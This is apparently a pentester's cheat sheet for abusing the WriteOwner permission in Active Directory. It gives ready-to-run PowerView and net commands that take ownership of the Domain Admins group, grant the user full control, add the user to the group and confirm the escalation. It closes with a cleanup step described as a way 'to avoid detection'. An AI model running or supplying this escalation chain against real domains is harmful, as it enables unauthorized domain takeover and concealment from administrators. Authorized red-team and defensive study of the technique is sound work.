### WriteOwner

#### Overview

Abusing **WriteOwner** permissions allows you to take ownership of an Active Directory object. This can be leveraged to modify permissions, gain privileges, or escalate access.

---
### Check user rights with powerview.ps1

```powershell
Invoke-ACLScanner -ResolveGUIDs | ? {$_.identityreferencename -like 'Target_user'}
```
- Out
``` bash
ObjectDN                : CN=Domain Admins,CN=Users,DC=object,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteOwner
```

### Workflow

#### 1. **Set Yourself as Owner**

Take ownership of the target object. Replace `<TargetObject>` with the name of the object and `<YourUsername>` with your account name.

```powershell
Set-DomainObjectOwner -Identity '<TargetObject>' -OwnerIdentity '<YourUsername>'
```

- **Example**: Set yourself as the owner of the `Domain Admins` group.
    
    ```powershell
    Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'john.doe'
    ```
    

---

#### 2. **Grant Full Permissions to Yourself**

Once you are the owner, grant your user full control over the object. Replace `<TargetObject>` and `<YourUsername>` as appropriate.

```powershell
Add-DomainObjectAcl -TargetIdentity '<TargetObject>' -PrincipalIdentity '<YourUsername>' -Rights all
```

- **Example**: Give yourself full rights on the `Domain Admins` group.
    
    ```powershell
    Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity 'john.doe' -Rights all
    ```
    

---

#### 3. **Add Yourself to a Privileged Group**

With the necessary permissions, add your user to a high-privilege group, such as `Domain Admins`. Replace `<TargetGroup>` and `<YourUsername>` as needed.

```powershell
Add-DomainGroupMember -Identity '<TargetGroup>' -Member '<YourUsername>'
```

- **Example**: Add yourself to the `Domain Admins` group.
    
    ```powershell
    Add-DomainGroupMember -Identity 'Domain Admins' -Member 'john.doe'
    ```
    

---

#### 4. **Verify the Membership**

Check if your user has been successfully added to the group.

```powershell
net group "<TargetGroup>" /domain
```

- **Example**: Confirm you are part of `Domain Admins`.
    
    ```powershell
    net group "Domain Admins" /domain
    ```
    

---

#### 5. **Log Off and Log Back In**

Log off and back on to apply the updated privileges for your session.

---

### Notes

- **Replace Placeholders**:
    
    - `<TargetObject>`: The object you want to control (e.g., `Domain Admins`, specific users, or groups).
        
    - `<YourUsername>`: Your user account (e.g., `john.doe`).
        
    - `<TargetGroup>`: The target group for privilege escalation (e.g., `Domain Admins`).
        
- **Authorization**: Ensure you have permission to perform this activity as part of an authorized security assessment.
    
- **Cleanup**: To avoid detection, restore the original owner and permissions after testing:
    
    ```powershell
    Set-DomainObjectOwner -Identity '<TargetObject>' -OwnerIdentity '<OriginalOwner>'
    ```
